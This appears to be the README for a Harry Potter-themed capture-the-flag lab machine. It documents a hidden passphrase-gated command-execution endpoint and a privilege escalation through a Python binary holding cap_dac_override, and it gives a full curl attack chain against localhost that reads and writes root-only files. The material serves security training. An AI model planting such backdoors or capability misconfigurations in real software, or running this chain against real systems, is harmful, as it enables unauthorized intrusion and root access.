# Hill 20 - Room of Requirement (Harry Potter) (repair -> hidden debug RCE -> cap_dac_override)

*Theme: Harry Potter.* A "repair-first" hill: the room starts in emergency mode (simulated)
and stays hidden until the emergency is cleared. Then a hidden endpoint runs commands once you
speak the passphrase.

- **Repair gate:** `POST /repair` with a body containing `set emergency=off` reveals the room.
- **Entry:** `GET /marauders?iSolemnlySwear=I%20am%20up%20to%20no%20good&cmd=...` runs commands.
  Foothold: `room`. Port 80 (8100 locally).
- **Privesc:** `/usr/local/bin/roompy` (a python copy) carries the **cap_dac_override**
  capability, which bypasses file permission checks - so it reads `/root/root.txt` and writes
  `/root/king.txt` despite their 0600 root ownership. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. clear the emergency (reveal the room)
    curl -s -X POST http://127.0.0.1:8100/repair --data-urlencode 'runbook=set emergency=off'

    # 2. hidden RCE -> user flag
    curl -s -G http://127.0.0.1:8100/marauders --data-urlencode 'iSolemnlySwear=I am up to no good' \
      --data-urlencode 'cmd=cat /home/room/user.txt'

    # 3. privesc via cap_dac_override -> root flag (reads a 0600 root file)
    curl -s -G http://127.0.0.1:8100/marauders --data-urlencode 'iSolemnlySwear=I am up to no good' \
      --data-urlencode 'cmd=roompy -c "print(open(\"/root/root.txt\").read())"'

    # 4. take the hill: write your token to /root/king.txt (bypassing its 0600 perms)
    curl -s -G http://127.0.0.1:8100/marauders --data-urlencode 'iSolemnlySwear=I am up to no good' \
      --data-urlencode 'cmd=roompy -c "open(\"/root/king.txt\",\"w\").write(\"TOK-YOUR-TEAM\")"'

## Run locally

    docker compose up -d --build   # app: http://localhost:8100/

## Reset behaviour

`reset.sh` re-applies `cap_dac_override` on `roompy` **and re-engages emergency mode**, so the
repair puzzle is fresh for the next attacker. It does **not** touch `king.txt`.
